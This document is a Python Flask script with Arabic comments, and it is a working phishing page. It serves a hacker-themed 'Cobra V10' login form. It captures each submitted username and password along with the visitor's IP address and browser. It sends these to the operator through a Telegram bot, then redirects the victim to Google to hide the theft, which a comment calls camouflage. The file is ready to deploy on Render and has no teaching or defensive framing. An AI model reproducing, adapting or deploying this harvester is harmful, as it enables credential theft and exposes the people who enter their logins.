import os
import requests
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# --- الإعدادات (تُجلب من Environment Variables في Render) ---
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('DEVELOPER_ID')

# --- واجهة الموقع (تصميم الهكر المحترف) ---
HTML_LOGIN = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cobra System | Login</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .login-box { background: rgba(20, 20, 20, 0.95); padding: 40px; border-radius: 5px; border: 1px solid #00ff41; box-shadow: 0 0 25px rgba(0, 255, 65, 0.2); width: 350px; text-align: center; position: relative; }
        .login-box::before { content: "SYSTEM ACCESS REQUIRED"; position: absolute; top: -10px; left: 20px; background: #050505; padding: 0 10px; font-size: 12px; }
        h2 { margin-bottom: 30px; text-transform: uppercase; font-size: 1.5rem; }
        input { width: 100%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00ff41; color: #00ff41; border-radius: 3px; box-sizing: border-box; }
        input::placeholder { color: rgba(0, 255, 65, 0.5); }
        button { width: 100%; padding: 12px; background: #00ff41; border: none; color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        button:hover { background: #000; color: #00ff41; border: 1px solid #00ff41; box-shadow: 0 0 15px #00ff41; }
        .warning { color: red; font-size: 0.7rem; margin-top: 20px; text-decoration: blink; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🐍 COBRA V10</h2>
        <form method="POST" action="/auth">
            <input type="text" name="u" placeholder="USERNAME / EMAIL" required>
            <input type="password" name="p" placeholder="PASSWORD" required>
            <button type="submit">EXECUTE LOGIN</button>
        </form>
        <div class="warning">⚠️ ENCRYPTED CONNECTION ESTABLISHED</div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_LOGIN)

@app.route('/auth', methods=['POST'])
def auth():
    # استخراج البيانات المدخلة
    user = request.form.get('u')
    pw = request.form.get('p')
    
    # جلب معلومات الزائر التقنية
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    agent = request.headers.get('User-Agent')
    
    # صياغة الرسالة لبوت تليجرام
    log_msg = (
        f"🎯 **[صيد جديد من الموقع]**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 **المستخدم:** `{user}`\n"
        f"🔑 **الباسورد:** `{pw}`\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{ip}`\n"
        f"📱 **الجهاز:** `{agent[:80]}...`"
    )
    
    # إرسال البيانات فوراً إلى تليجرام
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": ADMIN_ID, "text": log_msg, "parse_mode": "Markdown"})
    except:
        pass

    # تحويل المستخدم لموقع حقيقي (تمويه)
    return redirect("https://www.google.com")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
